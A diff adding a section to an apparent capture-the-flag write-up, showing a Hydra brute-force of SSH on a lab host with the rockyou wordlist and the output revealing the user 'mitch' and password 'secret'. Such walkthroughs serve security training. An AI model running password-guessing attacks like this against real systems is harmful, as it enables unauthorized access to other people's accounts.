@@ -202,6 +202,18 @@ sshd:x:123:65534::/var/run/sshd:/usr/sbin/nologin
 
 ```
 
+crack ssh
+```
+kali@kali:~/Documents$ hydra -l mitch -P /usr/share/wordlists/rockyou.txt 10.10.179.131 -t 4 -s 2222 ssh
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-27 09:19:11
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ssh://10.10.179.131:2222/
+[STATUS] 36.00 tries/min, 36 tries in 00:01h, 14344363 to do in 6640:55h, 4 active
+[2222][ssh] host: 10.10.179.131   login: mitch   password: secret
+```
+
 ### Where can you login with the details obtained?
 
 ### What's the user flag?
